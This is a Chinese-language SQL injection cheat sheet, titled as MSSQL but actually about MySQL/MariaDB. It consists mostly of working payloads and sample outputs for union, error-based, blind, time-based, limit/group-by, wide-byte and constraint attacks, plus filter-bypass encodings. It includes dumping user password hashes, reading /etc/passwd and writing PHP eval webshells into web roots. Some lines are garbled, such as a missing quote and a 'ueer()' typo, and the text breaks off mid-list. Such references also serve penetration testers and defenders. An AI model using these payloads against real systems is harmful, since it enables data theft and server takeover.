# Mssql注入

#### 查看当前数据库版本

```mysql
VERSION()
@@VERSION
@@GLOBAL.VERSION
```

#### 当前登录用户

```mysql
USER()
CURRENT_USER()
SYSTEM_USER()
SESSION_USER()
```

#### 当前使用的数据库

```mysql
DATABASE()
SCHEMA()
```

#### 当前的操作系统

```mysql
@@version_compile_os
```

#### 路径相关

```mysql
@@BASEDIR :mysql安装路径
@@SLAVE_LOAD_TMPDIR：临时文件夹路径
@@DATADIR : 数据存储路径
@@CHARACTER_SETS_DIR : 字符集设置文件路径
@@LOG_ERROR : 错误日志文件路径
@@PID_FILE : pid-file文件路径
@@BASEDIR : mysql安装路径
@@SLAVE_LOAD_TMPDIR : 临时文件夹路径
```

#### 字母/数字相关

```mysql
ASCII(): 获取字母的ascii码值
BIN(): 返回值的二进制串表示
CONV(): 进制转换
FLOOR(): 函数只返回整数部分，小数部分舍弃
ROUND(): 函数四舍五入，大于0.5的部分进位，不到则舍弃
LOWER()：转成小写字母
UPPER(): 转成大写字母
HEX():十六进制编码
UNHEX()：十六进制解码
```

#### 字符串截取

```mysql
MID(column_name,start[,length])  start起始为1
LEFT(str,length) length为从左边开始要返回的字符数
RIGHT(str,length). length为从右边开始要返回的字符数
SUBSTR(str,pos,len) 从pos开始截取len个,pos起始为1,pos 可以是负值
SUBSTRING(str,pos,len). 与subsets()相同
```

#### 注释

- **`- -`(- 后面有个空格)**

  **`select * from message ;-- -where id =1;`**

  **`select * from message ;--where id =1;`**

- **- -+**

  **`select * from message ;--+where id =1;`**

- **#**

  **`select * from message ;#where id =1;`**

- **%00**

  **`select * from message ;%00where id =1;`**

- **`/**/`**

  **`select * from message ;/*where id =1;*/`**

#### 常用语句

**查找所有用户**

**`select group_concat(user) from mysql.user;`**

**用户hash**

**`select group_concat(password) from mysql.user where user='root'`**

**数据库**

**`select group_concat(schema_name) from information_schema.schemata;`**

**`select distinct(database_name) from mysql.innodb_table_stats;`**

**`select distinct(DB) from mysql.db;`**

**表名**

**`select group_concat(table_name) from information_schema.tables where table_schema='table_name';`**

> **表中有主键约束，非空约束等完整性约束条件才能用这个语句查询出来**

**`select group_concat(table_name) from information_schema.table_constraints where table_schema='table_name_xxx';`**

> **mysql>5.6**

**`select distinct(table_name) from mysql.innodb_index_stats;`**

**列名**

**`select group_concat(column_name) from information_schema.columns where table_name='column_name_xxx';`**

**读文件**

**`select load_file('/etc/passwd');`**

**写文件**

**`select '<?php @eval($_POST[1]);?> into outfile '/var/www/html/shell.php';`**

### 注入技术

#### Union 注入

**判断是否可以注入**

**假设有`www.test.com/?id=1`**

**数值型注入**

**`?id=1+1`**

**`?id=-1 or 1=1`**

**`?id=-1 or 10-2=8`**

**`?id=1 and 1=2`**

**`?id=1 and 1=1`**

**字符型注入**

**`?id=1'`**

**`?id=1"`**

**`?id=1' and '1' = '1`**

**`?id=1" and "1" = "1`**

**`?id=1')`**

**`?id=1")`**

**`?id=1') and '1'='1`**

**`?id=1") and "1" = "1`**

**查询列数**

**用`union select` 注入时，若后面要注出的数据的列与原数据列数不同，则会失败。所以需要先猜解列数。**

**`union select 1,2,3 #`**

**`union all select 1,2,3 #`**

**`union all select null,null,null #`**

**`order by 10 #`**

**`order by 5 #`**

**`order by 2 #`**

**....**

**基本用法**

**`union select 1,password,3 from admin`**

**过滤了逗号的union注入**

**`select 1,2,3 union select * from (select version())a join (select database())b join (select database())c;`**

#### 报错注入

**利用数据库报错来显示数据的注入方式经常会在入侵中利用到，这种方法有一点局限性，需要页面有错误回显**

**分类**

> **MYSQL报错注入大体可分为以下几类：**
>
> - **BIGINT等数据类型溢出**
> - **xpath语法错误**
> - **concat+rand()+group_by()导致主键重复**
> - **空间数据类型函数错误**

**floor**

**注入语句**

**`?id=1 or (select 8627 from (select count(*),count(0x70307e,(select user()),0x7e7030,floor(rand(0)*2))x from information_schema.plugins group by x)a)`**

- **floor：函数只返回整数部分，小数部分舍弃**
- **round：函数四舍五入，大于0.5的部分进位，不到则舍弃**

**注入原理**

**目前比较常见的几种报错注入方法都是利用了mysql某些不能称为bug的bug来实现的**

**下面就以 `rand()` 函数来进行说明，mysql的官方文档中对`rand()`函数有特殊的说明：**

**`rand() in a where clause is re-evaluated every time the where is executed. You cannot use a column with rand() values in an order by clause,because order by would evaluate the column mltiple times. However, you can retrieve rows in random order like this;`**

**官方文档中的意思是：在`where` 语句中，`where`每执行一次，`rand()`函数就会被计算一次。`rand()`不能作为 `order by` 的条件字段，同理也不能作为 `group by` 的条件字段**

**因此在mysql中，可以构造一个值不确定而有可重复的字段作为 `group by` 的条件字段，这时就可以报出类似于 `Duplicate entry '...' for key 'group_key'`的错误**

**UpdateXml(有长度限制，最长32位)**

**MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是 `ExtractValue()` 和 `UpdateXML()`，因此在mysql小于5.1.5中不能用`ExtractValue` 和 `UpdateXML`进行报错注入**

**注入语句**

**`?id=1 and updatexml(1,concat(0x7e,(select @@version),0x7e),1)`**

**注入原理**

**`updatexml(XML_document,XPath_string,new_value);`**

- **第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc**
- **第二个参数：XPath_string(Xpath 格式的字符串)**
- **第三个参数：new_value，String格式，替换查找到的符合条件的数据**
- **作用：改变文档中符合条件的节点的值**

**返回结果为连接参数产生的字符串。如果任何一个参数为`NULL`，则返回值为`NULL`**

**通过查询`@@version`，返回版本。然后`CONCAT`将其字符串化，因为`UPDATEXML`第二个参数需要`Xpath`格式的字符串，所以不符合要求，然后报错。**

**ExtractValue(有长度限制，最长32位)**

**注入语句**

**`?id=1 and extractvalue(1,concat(0x7e,(select @@version),0x7e))`**

**注入原理**

**`extractvalue(XML_document,XPath_string);`**

- **第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc**
- **第二个参数：XPath_string(Xpath 格式的字符串)**
- **作用：从目标XML中返回包含所查询值的字符串**

**第二个参数都要求是符合`xpath`语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里**

**NAME_CONST(适用于低版本，不太好用)**

**`?id=261 and 1=(select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)`**

**Error based Double Query Injection**

**`?id=1 or group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1`**

**exp(5.5.5以上)**

**在mysql 5.5之前，整型溢出是不会报错的，根据官方文档说明 `out-of-range-and-overflow`，只有版本号大于5.5.5时，才会报错。利用 `exp`函数也产生类似的溢出错误**

**`?id=1 and (select exp(~(select * from (select user())x)))`**

**测试未通过，存在可用性的**

**`emetryCollection() multipoint() polygon() multipolygon() linestring() multilinestring()`**

**以上函数均为mysql中的空间数据类型(存储)的函数，目前仅在MylSAM数据引擎下提供空间索引支持，要求几何字段非空**

**`multipoint()`**

**`?id=1 or multipoint((select * from (select * from (select user())a)b))%23`**

**`multipolygon()`**

**`?id=1 or multipolygon((select * from (select * from (select database())a)b))%23`**

**`multilinestring()`**

**`?id=1 or multilinestring((select * from(select * from(select user())a)b))%23`**

**`linestring()`**

**`?id=1 or LINESTRING((select * from(select * from(select user())a)b))%23`**

**`GeometryCollection()`**

**`?id=1 or GeometryCollection((select * from(select * from(select user())a)b))%23`**

**`polygon()`**

**`?id=1 or polygon((select * from(select * from(select user())a)b))%23`**

#### Bool盲注

**在许多情况下，通过前面的测试会发现页面没有回显提取的数据，但是根据语句是否执行成功与否会有一些相应的变化**

- **正确/错误的语句使得页面有适度的变化，可用尝试使用布尔注入**
- **正确语句返回正常页面，错误的语句返回通用错误页面，可以尝试使用布尔注入**
- **提交错误语句，不影响页面的正常输出，建议尝试使用延时注入**

**几种简单的判断语句，在真实利用中需要根据情况而变化：**

- **CASE**
- **IF()**
- **IFNULL()**
- **NULLIF()**

**盲注的时候一定要注意，MySQL 4 之后大小写不敏感，可使用binary()函数使大小写敏感**

**构造bool条件**

> **正常情况**

**`'or bool#`**

**`true' and bool#`**

> **不使用空格、注释**

**`'or(bool)='1`**

**`true'and(bool)='1`**

> **不使用or、and、注释**

**`'^!(bool)='1`**

**`'=(bool)='`**

**`'||(bool)='1`**

**`true'%26%26(bool)='1`**

**`'=if((bool),1,0)='0`**

> **不使用等号、空格、注释**

**`'or(bool)<>'0`**

**`'or((bool)in(1))or'0`**

> **其他**

**`or (case when (bool) then 1 else 0 end)`**

**有时候`where`字句有括号又猜不到SQL语句的时候，可以有下列类似的fuzz**

**`1' or (bool) or '1'='1`**

**`1%' and (bool) or 1=1 and '1'='1`**

**有时候也可以通过与表中的数据进行对比**

```mysql
mysql> select * from admin where username="" || id=2 && password<"5";
+----+----------+----------+------+
| id | username | password | num  |
+----+----------+----------+------+
|  2 | admin    | 456      |   20 |
+----+----------+----------+------+
1 row in set (0.00 sec)
mysql> select * from admin where username="" || id=3 && password<"8";
+----+----------+----------+------+
| id | username | password | num  |
+----+----------+----------+------+
|  3 | test     | 789      |   30 |
+----+----------+----------+------+
1 row in set (0.00 sec)
mysql> select * from admin where username="" || id=3 && password<"7";
Empty set (0.00 sec)
```

**这样通过id指定的话改一下payload直接上脚本把数据全脱了。另外如果想跨表查询的话**

```mysql
mysql> select a.password<'z' from users a limit 1,1;
+----------------+
| a.password<'z' |
+----------------+
|              1 |
+----------------+
```

**构造逻辑判断**

> **使用逗号**

**`left(user(),1)>'r'`**

**`right(user(),1)>'r'`**

**`substr(user(),1,1)='r'`**

**`mid(user(),1,1)='r'`**

> **不使用逗号**

**`user() regexp '^[a-z]'`**

**`ueer() like 'root%'`**

**`POSITION('root' in user())`**

**`mid(user() from 1 for 1)='r'`**

**`mid(user() from 1)='r'`**

**`ASCII()`、`ORD`和`CHAR()`函数一般用做辅助**

**利用 order by 盲注**

```mysql
mysql> select * from admin where username='' or 1 union select 1,2,'5' order by 3;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | 2        | 5                                |
|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |
+----+----------+----------------------------------+
2 rows in set (0.00 sec)
    
mysql> select * from admin where username='' or 1 union select 1,2,'6' order by 3;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |
|  1 | 2        | 6                                |
+----+----------+----------------------------------+
2 rows in set (0.01 sec)
```

**这种注入一般出现在登录处，形成`bool`条件。这里只获取`password`的值，也可以跟多个`UNION`查询其他的数据，此方法优点在于不使用括号等字符。利用`order by` 姿势很多，自由发挥**

#### 延时注入

**一般会用到几个函数。使用这些的效果，是为了延缓mysql的操作，从而检测到与平时有异的情况：**

- **SLEEP(n)让mysql停n秒钟**
- **BENCHMARK(count,expr)重复countTimes次执行表达式expr，如`BENCHMARK(100000,MD5(1))`**

**`BENCHMARK()`用于测试函数的性能，参数一为次数，参数二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的CPU资源。推荐使用`sleep()`**

**一些注意事项：**

- **使用基于时间的盲注比较不准确，因为这还取决于当前的网络环境**
- **时间延缓最好不要超过30秒，否则容易导致mysql的API连接超时**
- **当在页面上看不到任何明显变化时，再考虑选择使用延时注入**

**相对于bool盲注，就是把返回值0和1改成是否执行延时，能用其他方法就不要使用延时**

**一般格式`if((bool),sleep(3),0)`和`or (case when (bool) then sleep(3) else 0 end)`**

**如果这两个函数ban掉的话可以利用笛卡尔积造成延迟来进行注入**

**`' and if(ascii(substr((select database()),%d,1))<%d,(select count(*) from information_schema.columns A, information_schema.columns B,information_schema.tables C),1) #`**

**另外还可以利用不正确的正则表达式来**

**`select if(substr((select 1)='1',1,1),concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',1);`**

**检测方法**

**`1 or sleep(25)=0 limit 1 #`**

**`1) or sleep(25)=0 limit 1 #`**

**`1' or sleep(25)=0 limit 1 #`**

**`') or sleep(25)=0 limit 1 #'`**

**`1)) or sleep(25)=0 limit 1 #`**

**`select sleep(25) #`**

**payload**

**`UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) < j,BENCHMARK(100000,SHA1(1)),0);`**

**`UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) < j,SLEEP(10),0);`**

#### insert/update/delete 注入

**insert**

**报错注入方式：**

**`insert into message(id,user_id,message_id) values (4,'zedd' or updatexml(1,concat(0x7e,(select @@version),0x7e),0) or '', 'hi');`**

**`insert into message(id,user_id,message_id) values (4,'zedd' or extractvalue(1,concat(0x7e,(select @@version))) or '', 'hi');`**

**没有回显可以使用延时：**

**`insert into message(id,user_id,message_id) values (5,'0' or IF(SUBSTR((SELECT GROUP_CONCAT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA),1,1)<200,SLEEP(10),0), 'hi');`**

**update**

**报错注入方式：**

**`update message set user_id='1' or updatexml(1,concat(0x7e,(version()),0x7e),0) or''WHERE id=2;`**

**`update message set user_id='1' or extractvalue(1,concat(0x7e,database())) or''WHERE id=2;`**

**delete**

**报错注入方式：**

**`delete from message where id=2 or updatexml(1,concat(0x7e,(version()),0x7e),0) or'';`**

**`delete from message where id=2 or extractvalue(1,concat(0x7e,database())) or'';`**

#### Order by 后注入

**报错注入**

**`1 and extractvalue(1, concat(0x7e, (select @@version),0x7e));`**

**bool盲注 利用 rand()**

**`order by IF((bool),1,(select 1 union select 2));`**

**使用`rand()`**

```mysql
MariaDB [test]> select id from message order by rand(true);
+----+
| id |
+----+
|  5 |
|  3 |
|  1 |
|  2 |
+----+
4 rows in set (0.002 sec)
MariaDB [test]> select id from message order by rand(false);
+----+
| id |
+----+
|  1 |
|  5 |
|  2 |
|  3 |
+----+
4 rows in set (0.001 sec)
```

**`rand(true)`与`rand(false)`返回不同来判断**

```mysql
MariaDB [test]> select id from message order by rand(SUBSTR((SELECT database()),1,1)>'t');
+----+
| id |
+----+
|  1 |
|  5 |
|  2 |
|  3 |
+----+
4 rows in set (0.001 sec)

MariaDB [test]> select id from message order by rand(SUBSTR((SELECT database()),1,1)<'t');
+----+
| id |
+----+
|  1 |
|  5 |
|  2 |
|  3 |
+----+
4 rows in set (0.000 sec)

MariaDB [test]> select id from message order by rand(SUBSTR((SELECT database()),1,1)='t');
+----+
| id |
+----+
|  5 |
|  3 |
|  1 |
|  2 |
+----+
4 rows in set (0.000 sec)
```

**延时注入 order by if()**

**不推荐，因为每条数据都会执行延时，能用其他方法就不使用延时**

```mysql
MariaDB [test]> select id from message order by IF(1,sleep(3),0);
+----+
| id |
+----+
|  1 |
|  2 |
|  3 |
|  5 |
+----+
4 rows in set (12.214 sec)
```

**延时了12s左右**

#### Limit注入

**先看看Mysql 5 中的select语法**

```mysql
SELECT 
    [ALL | DISTINCT | DISTINCTROW ] 
      [HIGH_PRIORITY] 
      [STRAIGHT_JOIN] 
      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] 
      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] 
    select_expr [, select_expr ...] 
    [FROM table_references 
    [WHERE where_condition] 
    [GROUP BY {col_name | expr | position} 
      [ASC | DESC], ... [WITH ROLLUP]] 
    [HAVING where_condition] 
    [ORDER BY {col_name | expr | position} 
      [ASC | DESC], ...] 
    [LIMIT {[offset,] row_count | row_count OFFSET offset}] 
    [PROCEDURE procedure_name(argument_list)] 
    [INTO OUTFILE 'file_name' export_options 
      | INTO DUMPFILE 'file_name' 
      | INTO var_name [, var_name]] 
    [FOR UPDATE | LOCK IN SHARE MODE]]
```

**可以看到`LIMIT`后可接`PROCEDURE`与`INTO`用于写webshell使用，这里不多说，我们重点来看`PROCUDURE`，而且这里与版本有关，新版本的在`	PROCUDURE`中已不再支持使用`SELECT`**

**老版本(为测试具体版本号，估计在5.7以前)可以若没有`order by` 后面可接`union`，有`order by`可用`benchmark`或者报错注入，详情参考[【SQL注入】mysql limit 注入](http://vinc.top/2017/04/01/[sql注入]mysql-limit-注入/)**

**报错注入**

```mysql
MariaDB [test]> select * from user where id>0 order by id LIMIT 0,1;
+----+----------+--------+
| id | username | passwd |
+----+----------+--------+
|  1 | admin    | admin  |
+----+----------+--------+
1 row in set (0.001 sec)

MariaDB [test]> select * from user where id>0 order by id LIMIT 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
ERROR 1105 (HY000): XPATH syntax error: ':10.3.11-MariaDB'
```

#### Group By 注入

**报错注入**

```mysql
MariaDB [test]> select * from user where id>0 GROUP BY id and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1);
ERROR 1105 (HY000): XPATH syntax error: '~10.3.11-MariaDB~'

MariaDB [test]> select * from user where id>0 GROUP BY id and (select 1 from(select count(*),concat((select (select (SELECT @@version)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);
ERROR 1062 (23000): Duplicate entry '10.3.11-MariaDB1' for key 'group_key'
```

**延时注入**

```mysql
MariaDB [test]> select * from user where id>0 GROUP BY id and if(mid(user(),1,1)='r',sleep(3),0);
+----+----------+--------+
| id | username | passwd |
+----+----------+--------+
|  1 | admin    | admin  |
+----+----------+--------+
1 row in set (9.150 sec)
```

**Union注入**

```mysql
MariaDB [test]> select * from user where id>0 GROUP BY id union select 1,2,3;
+----+----------+--------+
| id | username | passwd |
+----+----------+--------+
|  1 | admin    | admin  |
|  2 | hasaki   | hasaki |
|  3 | 666      | 2333   |
|  1 | 2        | 3      |
+----+----------+--------+
4 rows in set (0.000 sec)

MariaDB [test]> select * from user where id>0 GROUP BY id union select 1,2,3 limit 3,1;
+----+----------+--------+
| id | username | passwd |
+----+----------+--------+
|  1 | 2        | 3      |
+----+----------+--------+
1 row in set (0.000 sec)

MariaDB [test]> select * from user where id>0 GROUP BY id union select 1,user(),3 limit 3,1;
+----+----------------+--------+
| id | username       | passwd |
+----+----------------+--------+
|  1 | root@localhost | 3      |
+----+----------------+--------+
1 row in set (0.002 sec)
```

#### 读写文件

**利用sql注入可以导入导出文件，获取文件内容，或向恩家写入内容**

**查询用户读写权限：**

**`select file_priv from mysql.user where user='root';`**

**首先查看变量确定权限：**

**`show variables like '%secure%'`**

- **当secure_file_priv为空，就可以读取磁盘的目录**
- **当secure_file_priv为`G:\`，就可以读取G盘的文件**
- **当secure_file_priv为null，load_file就不能加载文件**

**load_file()读取**

**条件**

- **需要有读取文件的权限**

- **需要知道文件的绝对物理路径**

- **需要读取的文件大小必须小于max_allowed_packet**

  **`select @@max_allowed_packet;`**

**直接使用绝对路径**

**`SELECT LOAD_FILE("/etc/passwd");`**

**`SELECT LOAD_FILE(CHAR(47,101,116,99,47,112,97,115,115,119,100));`**

**`SELECT LOAD_FILE(0x2f6574632f706173737764);`**

**SELECT导出**

**条件**

- **一般要指定绝对路径**
- **需导出的目录有可写权限**
- **需要outfile出的文件不能已经存在**

**`select database() into outfile '/tmp/test';`**

**写入webshell**

**条件**

- **需要知道网站的绝对物理路径，这样导出后的webshell可访问**

- **对需导出的目录有可写权限**

  **`select "<?php eval($_POST['a']?>" into outfile '/var/www/html/shell.php';`**

#### 宽字节注入

**原理**

```mysql
mysql_query("SET NAMES 'gbk'");

$name = isset($_GET['name']) ? addslashes($_GET['name']) : 1;
$sql = "SELECT * FROM test WHERE names='{$name}'";
```

**`addslashes()`会在单引号或双引号前加上一个`\`。当mysql使用GBK字符集时，会把两个字符当作一个汉字，如`%df%5c`为运字。我们输入`name=root%df%27`，`%`在服务器端会出现如下转换：`root%df%27`--> `root%df%5c%27` --> `root运`**

**更多内容可见：[浅析白盒审计中的字符编码及SQL注入](https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html)**

**利用**

**`index.php?name=1%df'`**

**`index.php?name=1%a1'`**

**`index.php?name=1%aa'`**

**....**

**在被`addslashes`后，出现`%XX%5c`，当前一个字符的ascii码大于128时，会被认为是一个宽字符，即使它不是个汉字。所以不是仅仅`%df`可以吃掉`\`**

#### 表名可控注入

**详细可参考[当表名可控的注入遇到了Describe时的几种情况](http://www.yulegeyu.com/2017/04/16/当表名可控的注入遇到了Describe时的几种情况。/)**

**表名不完全可控且DESC的表名含有反引号，SELECT的表名不含反引号**

**test.php 代码如下：**

```php
<?php
mysql_connect("127.0.0.1","root","123456");
mysql_query("use test");
$table = $_GET['table'];
mysql_query("desc `shop_$table`") or die("DESC 出错:".mysql_error());
$sql = "select * from shop_$table where 1=1";
echo $sql;
echo "<br><br><br><br><br><br><br>";
var_dump(mysql_fetch_array(mysql_query("$sql")));
echo mysql_error();
```

**payload:**

```mysql
user` `where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)%23`
```

**shop_users 后面的两个``，做了shop_users表的别名，所以无影响，不会进入 die。sql语句才得以执行**

```mysql
select * from message `` where updatexml(1,concat(0x7e,(select user()),0x7e),1)#; where 1=1;
```

![mysql_sql-1](https://github.com/linl-sec/linlsec.github.io/blob/main/images/Web%E5%AE%89%E5%85%A8/mysql_sql-1.jpg)

**表名不完全可控且DESC的表名不含反引号，SELECT的表名含有反引号**

**test.php 源码如下：**

```php
<?php
mysql_connect("127.0.0.1","root","123456");
mysql_query("use test");
$table = $_GET['table'];
mysql_query("desc shop_{$table}") or die("DESC 出错:".mysql_error());
$sql = "select * from `shop_{$table}` where 1=1";
echo $sql;
echo "<br><br><br><br><br><br><br>";
var_dump(mysql_fetch_array(mysql_query("$sql")));
echo mysql_error();
```

**payload：**

```mysql
user` where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)%23`
```

**sql语句：**

```mysql
select * from `shop_user` where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)#`` where 1=1
```

![mysql_sql-2](https://github.com/linl-sec/linlsec.github.io/blob/main/images/Web%E5%AE%89%E5%85%A8/mysql_sql-2.jpg)

#### 无列名注入

**别名**

```mysql
MariaDB [test]> select * from (select 1)a,(select 2)b,(select 3)c;
+---+---+---+
| 1 | 2 | 3 |
+---+---+---+
| 1 | 2 | 3 |
+---+---+---+
1 row in set (0.000 sec)

MariaDB [test]> select * from (select 1)a,(select 2)b,(select 3)c union select * from user;
+---+--------+--------+
| 1 | 2      | 3      |
+---+--------+--------+
| 1 | 2      | 3      |
| 1 | admin  | admin  |
| 2 | hasaki | hasaki |
| 3 | 666    | 2333   |
+---+--------+--------+
4 rows in set (0.001 sec)

MariaDB [test]> select e.3 from (select * from (select 1)a,(select 2)b,(select 3)c union select * from user)e;
+--------+
| 3      |
+--------+
| 3      |
| admin  |
| hasaki |
| 2333   |
+--------+
4 rows in set (0.001 sec)

MariaDB [test]> select e.3 from (select * from (select 1)a,(select 2)b,(select 3)c union select * from user)e limit 1 offset 3 ;
+------+
| 3    |
+------+
| 2333 |
+------+
1 row in set (0.001 sec)

MariaDB [test]> select * from user where id=1 union select 1,2,3;
+----+----------+--------+
| id | username | passwd |
+----+----------+--------+
|  1 | admin    | admin  |
|  1 | 2        | 3      |
+----+----------+--------+
2 rows in set (0.000 sec)

MariaDB [test]> select * from user where id=1 union select (select e.3 from (select * from (select 1)a,(select 2)b,(select 3)c union select * from user)e limit 1 offset 3),2,3;
+------+----------+--------+
| id   | username | passwd |
+------+----------+--------+
| 1    | admin    | admin  |
| 2333 | 2        | 3      |
+------+----------+--------+
2 rows in set (0.001 sec)
```

**变量**

**使用变量需要执行两次`sql`**

```mysql
MariaDB [test]> select * from user limit 0,1 into @a,@b,@c;
Query OK, 1 row affected (0.001 sec)

MariaDB [test]> select * from user where username='' union select @a,@b,@c;
+------+----------+--------+
| id   | username | passwd |
+------+----------+--------+
|    1 | admin    | admin  |
+------+----------+--------+
1 row in set (0.002 sec)
```

#### 可报错时爆表名、字段名、库名

**字段名**

**无列名注入，但是如果再进行限制，不允许使用`union`该怎么破呢？**

```mysql
MariaDB [test]> select * from user where id=1 and (select * from (select * from user as a join user as b) as c);
ERROR 1060 (42S21): Duplicate column name 'id'
```

**把当前表第一个字段成功爆出来了。这个的原理就是在使用别名的时候，表中不能出现相同的字段名，于是我们就利用`join`把表扩充成两份，在最后别名 c 的时候查询到重复字段，就成功报错。**

**同时，可以利用`using`爆其他字段：**

```mysql
MariaDB [test]> select * from user where id=1 and (select * from (select * from user as a join user as b using(id)) as c);
ERROR 1060 (42S21): Duplicate column name 'username'

MariaDB [test]> select * from user where id=1 and (select * from (select * from user as a join user as b using(id,username)) as c);
ERROR 1060 (42S21): Duplicate column name 'passwd'
```

**表名**

**Mysql 文档中有一个函数：**

**`Polygon(ls1, ls2, …)`**

**`Polygon`从多个`LineString`或`WKB LineString`参数 构造一个值 。如果任何参数不表示`LinearRing`（也就是说，不是一个封闭和简单的`LineString`），返回值就是 NULL**

**如果传参不是`linestring`的话，就会爆错，而当如果我们传入的是存在的字段的话，就会爆出已知库、表、列**

**`select * from user where id=1 and polygon(1);`**

**`select * from user where id=1 and polygon(()select * from (select user())a)b);`**

**库名**

**上面的方法已经可以爆出库名了，提供另一个方法**

**`select * from user where id =1-a();`**

#### 约束攻击

**首先mysql 5.5 版本以上需要设置数据库为宽松模式，避免出现插入错误error**

**`set @@sql_mode=ANSI;`**

**首先查看原来的`sql_mode`，修改一次`sql_mode`**

```mysql
mysql> select @@sql_mode;
+-------------------------------------------------------------------------------------------------------------------------------------------+
| @@sql_mode                                                                                                                                |
+-------------------------------------------------------------------------------------------------------------------------------------------+
| ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION |
+-------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set (0.00 sec)

mysql> set @@sql_mode=ANSI;
Query OK, 0 rows affected, 1 warning (0.00 sec)

mysql> select @@sql_mode;
+--------------------------------------------------------------------------------+
| @@sql_mode                                                                     |
+--------------------------------------------------------------------------------+
| REAL_AS_FLOAT,PIPES_AS_CONCAT,ANSI_QUOTES,IGNORE_SPACE,ONLY_FULL_GROUP_BY,ANSI |
+--------------------------------------------------------------------------------+
1 row in set (0.00 sec)
```

**在宽松模式下创建数据库，并且先插入`admin`的数据**

```mysql
mysql> CREATE TABLE users (
    -> username varchar(25),
    -> password varchar(25)
    -> );
Query OK, 0 rows affected (0.02 sec)

mysql> INSERT INTO users(username,password) VALUES ('admin', 'rand_pass');
Query OK, 1 row affected (0.001 sec)

mysql> select * from users where username='admin';
+----------+-----------+
| username | password  |
+----------+-----------+
| admin    | rand_pass |
+----------+-----------+
1 row in set (0.00 sec)
```

**尝试查询包含有空格的`admin`数据，发现空格被截断，查到`admin`的数据**

```mysql
mysql> select * from users where username = 'admin           ';
+----------+-----------+
| username | password  |
+----------+-----------+
| admin    | rand_pass |
+----------+-----------+
1 row in set (0.00 sec)
```

**接着尝试插入`admin`后面包含有空格的账户，使得前25个字符只包含有`admin`与空格**

```mysql
mysql> INSERT INTO users(username,password) VALUES ('admin                       1', '123456');
Query OK, 1 row affected (0.001 sec)

mysql> select * from users;
+---------------------------+-----------+
| username                  | password  |
+---------------------------+-----------+
| admin                     | rand_pass |
| admin                     | 123456    |
+---------------------------+-----------+
2 rows in set (0.00 sec)


mysql> select * from users where username = 'admin' and password = '123456';
+---------------------------+----------+
| username                  | password |
+---------------------------+----------+
| admin                     | 123456   |
+---------------------------+----------+
1 row in set (0.00 sec)
```

**可以发现我们成功查找到`username=admin`的账户，后面不需要为 1 ，只要用空格填充前面的字符直到满足 25 个字符**

**`INSERT INTO users(username,password) VALUES ('admin                       x', 'hasaki');`**

#### 一次性注入出全部结构

**`(SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema>=@) AND (@)IN (@:=CONCAT(@,0x0a,' [ ',table_schema,' ] >',table_name,' > ',column_name))))x)`**

**如果可以回显，可以用这个payload一次性全部注入出表结构**

### 绕过技巧

#### 空格替代

**`%09 %0A %0B %0C %0D %A0 %20 /**/  /*!*/`**

**`1'/*!Union*//*!select*/1,2#`**

**`1'/*!Union*/select/*!1,2*/#`**

**`select username() from user where 1=1 and 2=2`**

> **可以写成**

**`select(username())from user where(1=1)and(2=2)`**

#### 绕过关键字

**双写关键字**

**对于针对替换关键字的绕过，我们可以使用双写关键字来绕过，例如`uniunionon`**

**十六进制**

**`select a from yz where b=0x32;`**

**`select * from yz where b=char(0x32);`**

**`select * from yz where b=char(0x67)+char(0x75)+char(0x65)+char(0x73)+char(0x74)`**

**`select column_name  from information_schema.tables where table_name="users"`**

**`select column_name  from information_schema.tables where table_name=0x7573657273`**

**`SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))`**

**ASCII**

**`or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)`**

> **双重编码绕过**

**`?id=1%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/1,2,password%252f%252a*/FROM%252f%252a*/Users--+`**

> **一些unicode编码举例：**

> **单引号：'**

**`%u0027 %u02b9 %u02bc`**

**`%u02c8 %u2032`**

**`%uff07 %c0%27`**

**`%c0%a7 %e0%80%a7`**

> **空白： **

